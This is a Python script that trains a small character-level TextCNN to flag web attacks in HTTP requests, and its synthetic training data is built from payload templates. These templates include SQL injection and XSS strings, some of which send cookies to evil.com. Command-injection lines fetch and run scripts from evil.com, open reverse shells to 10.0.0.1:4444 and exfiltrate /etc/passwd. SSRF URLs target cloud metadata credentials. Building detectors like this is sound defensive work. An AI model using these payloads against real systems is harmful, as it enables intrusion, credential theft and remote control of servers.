#!/usr/bin/env python3
"""
train_textcnn.py — TextCNN 字符级攻击识别训练脚本

功能:
  训练一个轻量 TextCNN 模型，识别 HTTP 请求中的攻击模式。
  包括: SQL注入、XSS、路径遍历、命令注入、SSRF、暴力破解。

  训练数据: 内置合成数据集（基于真实攻击模式模板生成）
  - 正常请求 2000 条
  - 攻击请求 2000 条（6类攻击各约330条）
  - 总计 4000 条

  模型: Embedding + 3种kernel的Conv1d + MaxPool + Linear
  参数量: ~30万
  预计 CPU 训练时间: 5-10分钟

  输出: textcnn.pt

版权: 完全自训练，零版权风险。训练数据基于公开的攻击模式知识合成。
"""

import torch
import torch.nn as nn
import torch.nn.functional as F
from torch.utils.data import Dataset, DataLoader
import random
import time
import os

# ─── 超参数 ─────────────────────────────────────────────────

VOCAB_SIZE = 128        # ASCII 字符集
EMBED_DIM = 32
NUM_FILTERS = 64
KERNEL_SIZES = [3, 4, 5]   # TextCNN 经典三种窗口
MAX_SEQ_LEN = 128       # 最大字符长度
NUM_CLASSES = 7          # normal + 6种攻击
HIDDEN_DIM = 64
DROPOUT = 0.3
LEARNING_RATE = 1e-3
BATCH_SIZE = 64
EPOCHS = 15
SEED = 42

random.seed(SEED)
torch.manual_seed(SEED)

# ─── 模型 ───────────────────────────────────────────────────

class TextCNN(nn.Module):
    """
    TextCNN: 字符级卷积文本分类器

    架构:
        Input (char indices)  [B, L]
        → Embedding           [B, L, E]
        → Conv1d (k=3,4,5)    [B, F, L-k+1] x3
        → MaxPool             [B, F] x3
        → Concat              [B, F*3]
        → Dropout
        → Linear              [B, H]
        → Linear              [B, C]

    参数量: ~30万
    """

    def __init__(self, vocab_size=VOCAB_SIZE, embed_dim=EMBED_DIM,
                 num_filters=NUM_FILTERS, kernel_sizes=KERNEL_SIZES,
                 num_classes=NUM_CLASSES, hidden_dim=HIDDEN_DIM, dropout=DROPOUT):
        super().__init__()

        # 字符嵌入
        self.embedding = nn.Embedding(vocab_size, embed_dim, padding_idx=0)

        # 多尺度卷积
        self.convs = nn.ModuleList([
            nn.Conv1d(embed_dim, num_filters, kernel_size=k, padding=k//2)
            for k in kernel_sizes
        ])

        # 分类头
        self.dropout = nn.Dropout(dropout)
        self.fc1 = nn.Linear(num_filters * len(kernel_sizes), hidden_dim)
        self.fc2 = nn.Linear(hidden_dim, num_classes)

    def forward(self, x):
        # x: [B, L] char indices
        embedded = self.embedding(x)  # [B, L, E]
        embedded = embedded.transpose(1, 2)  # [B, E, L] (Conv1d 需要 channel-first)

        # 多尺度卷积 + 全局最大池化
        conv_outputs = []
        for conv in self.convs:
            c = F.relu(conv(embedded))  # [B, F, L']
            c = F.max_pool1d(c, c.size(2)).squeeze(2)  # [B, F]
            conv_outputs.append(c)

        # 拼接
        cat = torch.cat(conv_outputs, dim=1)  # [B, F*3]
        cat = self.dropout(cat)

        # 分类
        h = F.relu(self.fc1(cat))
        logits = self.fc2(h)

        return logits

    def get_feature_vector(self, x):
        """提取特征向量（64维），供 MessageBus 使用"""
        embedded = self.embedding(x)
        embedded = embedded.transpose(1, 2)

        conv_outputs = []
        for conv in self.convs:
            c = F.relu(conv(embedded))
            c = F.max_pool1d(c, c.size(2)).squeeze(2)
            conv_outputs.append(c)

        cat = torch.cat(conv_outputs, dim=1)
        # 通过 fc1 但不通过 fc2，得到 hidden_dim 维特征
        feat = F.relu(self.fc1(cat))

        return feat  # [B, hidden_dim]


# ─── 数据集 ─────────────────────────────────────────────────

# 攻击类别: 0=normal, 1=sql_injection, 2=xss, 3=path_traversal,
#           4=command_injection, 5=ssrf, 6=brute_force
CLASS_NAMES = ["normal", "sql_injection", "xss", "path_traversal",
               "command_injection", "ssrf", "brute_force"]

# 正常请求模板
NORMAL_TEMPLATES = [
    "GET /index.html HTTP/1.1",
    "GET /api/users?page=1&limit=20 HTTP/1.1",
    "POST /api/login HTTP/1.1",
    "GET /products?category=electronics HTTP/1.1",
    "GET /search?q=laptop&sort=price HTTP/1.1",
    "GET /static/css/main.css HTTP/1.1",
    "GET /images/logo.png HTTP/1.1",
    "POST /api/register HTTP/1.1",
    "GET /profile/settings HTTP/1.1",
    "GET /docs/getting-started HTTP/1.1",
    "GET /blog/post?id=123 HTTP/1.1",
    "GET /api/products?filter=active HTTP/1.1",
    "POST /api/comment HTTP/1.1",
    "GET /dashboard HTTP/1.1",
    "GET /api/orders?status=shipped HTTP/1.1",
    "GET /about HTTP/1.1",
    "GET /contact HTTP/1.1",
    "GET /faq HTTP/1.1",
    "POST /api/feedback HTTP/1.1",
    "GET /api/user/profile HTTP/1.1",
    "GET /news/category/tech HTTP/1.1",
    "GET /download/file.pdf HTTP/1.1",
    "GET /api/search?query=python HTTP/1.1",
    "GET /settings/preferences HTTP/1.1",
    "POST /api/subscribe HTTP/1.1",
    "GET /api/notifications HTTP/1.1",
    "GET /help/articles HTTP/1.1",
    "GET /api/trending HTTP/1.1",
    "GET /user/messages HTTP/1.1",
    "GET /api/recommendations HTTP/1.1",
]

# SQL 注入模板
SQL_INJECTION_TEMPLATES = [
    "1' OR '1'='1",
    "1' OR '1'='1' --",
    "' OR 1=1 --",
    "1; DROP TABLE users --",
    "1' UNION SELECT * FROM users --",
    "admin' --",
    "' OR ''='",
    "1' AND 1=1 --",
    "1' AND 1=2 --",
    "' UNION SELECT username, password FROM users --",
    "1'; EXEC xp_cmdshell('dir') --",
    "1' OR '1'='1' /*",
    "admin' OR '1'='1' #",
    "1' UNION SELECT NULL, version() --",
    "1' UNION SELECT table_name FROM information_schema.tables --",
    "' OR EXISTS(SELECT * FROM users) --",
    "1' AND (SELECT COUNT(*) FROM users)>0 --",
    "1'; WAITFOR DELAY '0:0:5' --",
    "1' UNION SELECT 1,2,3,4,5 --",
    "1' OR SLEEP(5) --",
    "' UNION ALL SELECT NULL,NULL,NULL --",
    "1' UNION SELECT user, password FROM mysql.user --",
    "' OR 1=1 LIMIT 1 --",
    "1' UNION SELECT @@version, current_user() --",
    "1' AND BENCHMARK(5000000, MD5('test')) --",
    "GET /search?q=1' OR '1'='1 HTTP/1.1",
    "GET /product?id=1; DROP TABLE products -- HTTP/1.1",
    "POST /login user=admin' OR '1'='1'&pass=x HTTP/1.1",
    "GET /api/user?id=1' UNION SELECT * FROM admin -- HTTP/1.1",
    "1' UNION SELECT column_name FROM information_schema.columns --",
]

# XSS 模板
XSS_TEMPLATES = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<script>document.cookie</script>",
    "<body onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "<script>fetch('http://evil.com?c='+document.cookie)</script>",
    '"><script>alert(1)</script>',
    "<script src=http://evil.com/xss.js></script>",
    "<input onfocus=alert(1) autofocus>",
    "<details open ontoggle=alert(1)>",
    "<script>new Image().src='http://evil.com?'+document.cookie</script>",
    "<a href=javascript:alert(1)>click</a>",
    "<form action=http://evil.com><input type=submit>",
    "GET /search?q=<script>alert(1)</script> HTTP/1.1",
    "GET /comment?text=<img src=x onerror=alert(1)> HTTP/1.1",
    "POST /api/message content=<script>steal()</script> HTTP/1.1",
    "<script>var x=new XMLHttpRequest();x.open('GET','http://evil.com?c='+document.cookie);x.send()</script>",
    "<style>@import 'http://evil.com/xss.css'</style>",
]

# 路径遍历模板
PATH_TRAVERSAL_TEMPLATES = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "../../../etc/shadow",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252f..%252f..%252fetc%252fpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "C:\\windows\\win.ini",
    "../../../proc/self/environ",
    "....//....//....//etc/passwd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%2fpasswd",
    "GET /file?path=../../../etc/passwd HTTP/1.1",
    "GET /download?f=../../../../etc/shadow HTTP/1.1",
    "GET /static/../../../windows/system32/config/sam HTTP/1.1",
    "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam",
    "/var/log/auth.log",
    "../../../root/.ssh/id_rsa",
    "..//..//..//etc/passwd",
    "/etc/nginx/nginx.conf",
]

# 命令注入模板
COMMAND_INJECTION_TEMPLATES = [
    "; cat /etc/passwd",
    "| whoami",
    "&& id",
    "; ls -la /",
    "| nc -e /bin/sh 10.0.0.1 4444",
    "; wget http://evil.com/shell.sh -O /tmp/sh.sh; chmod +x /tmp/sh.sh; /tmp/sh.sh",
    "$(curl http://evil.com/payload.sh | bash)",
    '; python -c "import socket,os,pty;s=socket.socket();s.connect((10.0.0.1,4444));..."',
    "`id`",
    "; echo 'hacked' > /var/www/html/index.html",
    "| ping -c 4 10.0.0.1",
    "&& curl http://evil.com/exfil?data=$(cat /etc/passwd | base64)",
    "; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
    "GET /ping?host=8.8.8.8;cat /etc/passwd HTTP/1.1",
    "GET /exec?cmd=|whoami HTTP/1.1",
    "; for i in $(ls /); do cat /$i; done",
    "| curl -s http://evil.com/botnet.sh | bash",
    "; crontab -l; echo '* * * * * /tmp/bot.sh' | crontab -",
    "$({cat,/etc/passwd})",
    "; perl -e 'use Socket;...'",
]

# SSRF 模板
SSRF_TEMPLATES = [
    "http://169.254.169.254/latest/meta-data/",
    "http://localhost:6379/",
    "http://127.0.0.1:8080/admin",
    "http://[::1]/",
    "http://0.0.0.0:22/",
    "file:///etc/passwd",
    "gopher://127.0.0.1:6379/_INFO",
    "dict://localhost:11211/stats",
    "http://internal-service.local/api/secret",
    "http://169.254.169.254/computeMetadata/v1/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "GET /fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1",
    "GET /proxy?dest=http://localhost:8080 HTTP/1.1",
    "http://[::ffff:127.0.0.1]/",
    "http://0x7f000001/",
    "http://2130706433/",
    "http://127.0.0.1:3000/api/internal",
    "gopher://127.0.0.1:25/_HELO%20localhost",
    "file:///proc/self/environ",
    "http://192.168.1.1/admin/config",
]

# 暴力破解模板
BRUTE_FORCE_TEMPLATES = [
    "POST /login user=admin&password=123456 HTTP/1.1",
    "POST /login user=admin&password=password HTTP/1.1",
    "POST /login user=admin&password=admin HTTP/1.1",
    "POST /login user=root&password=toor HTTP/1.1",
    "POST /login user=admin&password=admin123 HTTP/1.1",
    "POST /login user=admin&password=Password1 HTTP/1.1",
    "POST /login user=admin&password=letmein HTTP/1.1",
    "POST /login user=admin&password=welcome HTTP/1.1",
    "POST /login user=admin&password=monkey HTTP/1.1",
    "POST /login user=admin&password=dragon HTTP/1.1",
    "POST /login user=admin&password=master HTTP/1.1",
    "POST /login user=admin&password=qwerty HTTP/1.1",
    "POST /login user=admin&password=12345678 HTTP/1.1",
    "POST /login user=admin&password=iloveyou HTTP/1.1",
    "POST /login user=admin&password=trustno1 HTTP/1.1",
    "POST /login user=admin&password=sunshine HTTP/1.1",
    "POST /login user=admin&password=princess HTTP/1.1",
    "POST /login user=admin&password=football HTTP/1.1",
    "POST /login user=admin&password=shadow HTTP/1.1",
    "POST /login user=admin&password=passwd HTTP/1.1",
]


class SecurityDataset(Dataset):
    """安全检测数据集"""

    def __init__(self, num_normal=2000, num_attack_per_class=330):
        self.samples = []
        self.labels = []

        # 正常请求
        for _ in range(num_normal):
            template = random.choice(NORMAL_TEMPLATES)
            # 随机变换: 添加参数、修改路径等
            sample = self._augment_normal(template)
            self.samples.append(sample)
            self.labels.append(0)

        # 攻击请求
        attack_templates = [
            (SQL_INJECTION_TEMPLATES, 1),
            (XSS_TEMPLATES, 2),
            (PATH_TRAVERSAL_TEMPLATES, 3),
            (COMMAND_INJECTION_TEMPLATES, 4),
            (SSRF_TEMPLATES, 5),
            (BRUTE_FORCE_TEMPLATES, 6),
        ]

        for templates, label in attack_templates:
            for _ in range(num_attack_per_class):
                template = random.choice(templates)
                sample = self._augment_attack(template)
                self.samples.append(sample)
                self.labels.append(label)

        print(f"[数据集] 生成完成: {len(self.samples)} 条样本")
        print(f"  正常: {num_normal} 条")
        print(f"  攻击: {num_attack_per_class * 6} 条 (每类 {num_attack_per_class})")

    def _augment_normal(self, template):
        """正常请求增强"""
        # 随机添加参数
        if random.random() < 0.3:
            params = [f"ref={random.choice(['google','direct','email'])}",
                      f"lang={random.choice(['en','zh','ja'])}",
                      f"v={random.randint(1, 100)}"]
            template += "&" + random.choice(params)
        # 随机大小写
        if random.random() < 0.2:
            template = template.lower()
        return template

    def _augment_attack(self, template):
        """攻击样本增强"""
        # 随机大小写混合
        if random.random() < 0.3:
            template = template.replace("OR", "oR").replace("UNION", "UnIoN")
        # 随机添加空格
        if random.random() < 0.2:
            template = template.replace(" ", "  ", 1)
        # URL 编码变体
        if random.random() < 0.2:
            template = template.replace("../", "..%2f")
        return template

    def __len__(self):
        return len(self.samples)

    def __getitem__(self, idx):
        text = self.samples[idx]
        label = self.labels[idx]

        # 字符级编码: ASCII 值 mod 128
        chars = [min(ord(c), 127) for c in text[:MAX_SEQ_LEN]]
        # 补零
        while len(chars) < MAX_SEQ_LEN:
            chars.append(0)

        return torch.tensor(chars, dtype=torch.long), torch.tensor(label, dtype=torch.long)


# ─── 训练 ───────────────────────────────────────────────────

def train():
    print("=" * 60)
    print("  TextCNN 训练 — 字符级攻击识别")
    print("=" * 60)
    print()

    # 数据集
    dataset = SecurityDataset()
    train_size = int(0.8 * len(dataset))
    test_size = len(dataset) - train_size
    train_dataset, test_dataset = torch.utils.data.random_split(
        dataset, [train_size, test_size]
    )

    train_loader = DataLoader(train_dataset, batch_size=BATCH_SIZE, shuffle=True)
    test_loader = DataLoader(test_dataset, batch_size=BATCH_SIZE, shuffle=False)

    print(f"  训练集: {train_size} 条")
    print(f"  测试集: {test_size} 条")
    print()

    # 模型
    model = TextCNN()
    param_count = sum(p.numel() for p in model.parameters())
    print(f"  模型参数量: {param_count:,} ({param_count * 4 / 1024:.1f} KB)")
    print()

    # 优化器 + 损失函数
    optimizer = torch.optim.AdamW(model.parameters(), lr=LEARNING_RATE, weight_decay=1e-4)
    scheduler = torch.optim.lr_scheduler.CosineAnnealingLR(optimizer, T_max=EPOCHS)
    criterion = nn.CrossEntropyLoss()

    # 训练循环
    print("  开始训练:")
    print("  " + "-" * 56)

    best_acc = 0.0
    best_state = None

    for epoch in range(EPOCHS):
        model.train()
        total_loss = 0
        correct = 0
        total = 0
        t0 = time.time()

        for batch_x, batch_y in train_loader:
            optimizer.zero_grad()
            logits = model(batch_x)
            loss = criterion(logits, batch_y)
            loss.backward()

            # 梯度裁剪
            torch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0)

            optimizer.step()

            total_loss += loss.item()
            pred = logits.argmax(dim=1)
            correct += (pred == batch_y).sum().item()
            total += batch_y.size(0)

        scheduler.step()

        train_loss = total_loss / len(train_loader)
        train_acc = correct / total

        # 验证
        model.eval()
        test_correct = 0
        test_total = 0
        with torch.no_grad():
            for batch_x, batch_y in test_loader:
                logits = model(batch_x)
                pred = logits.argmax(dim=1)
                test_correct += (pred == batch_y).sum().item()
                test_total += batch_y.size(0)

        test_acc = test_correct / test_total
        elapsed = time.time() - t0

        # 保存最佳模型
        if test_acc > best_acc:
            best_acc = test_acc
            best_state = {k: v.clone() for k, v in model.state_dict().items()}

        print(f"  Epoch {epoch+1:2d}/{EPOCHS} | Loss: {train_loss:.4f} | "
              f"Train Acc: {train_acc:.1%} | Test Acc: {test_acc:.1%} | {elapsed:.1f}s")

    print("  " + "-" * 56)
    print(f"  最佳测试准确率: {best_acc:.1%}")
    print()

    # 保存最佳模型
    os.makedirs("/root/.codebuddy/artifact/star_os/models", exist_ok=True)
    save_path = "/root/.codebuddy/artifact/star_os/models/textcnn.pt"
    torch.save({
        "model_state": best_state,
        "model_config": {
            "vocab_size": VOCAB_SIZE,
            "embed_dim": EMBED_DIM,
            "num_filters": NUM_FILTERS,
            "kernel_sizes": KERNEL_SIZES,
            "num_classes": NUM_CLASSES,
            "hidden_dim": HIDDEN_DIM,
            "max_seq_len": MAX_SEQ_LEN,
        },
        "class_names": CLASS_NAMES,
        "accuracy": best_acc,
        "param_count": param_count,
    }, save_path)

    print(f"  模型已保存: {save_path}")
    print(f"  文件大小: {os.path.getsize(save_path) / 1024:.1f} KB")
    print()

    # 分类别测试
    print("  分类别准确率:")
    print("  " + "-" * 56)
    model.load_state_dict(best_state)
    model.eval()

    class_correct = [0] * NUM_CLASSES
    class_total = [0] * NUM_CLASSES

    with torch.no_grad():
        for batch_x, batch_y in test_loader:
            logits = model(batch_x)
            pred = logits.argmax(dim=1)
            for i in range(len(batch_y)):
                label = batch_y[i].item()
                class_total[label] += 1
                if pred[i].item() == label:
                    class_correct[label] += 1

    for i, name in enumerate(CLASS_NAMES):
        acc = class_correct[i] / max(class_total[i], 1)
        bar = "█" * int(acc * 30)
        print(f"    {name:20s} {acc:.1%} {bar}")

    print()
    print("=" * 60)
    print("  TextCNN 训练完成!")
    print("=" * 60)

    return best_acc


if __name__ == "__main__":
    train()
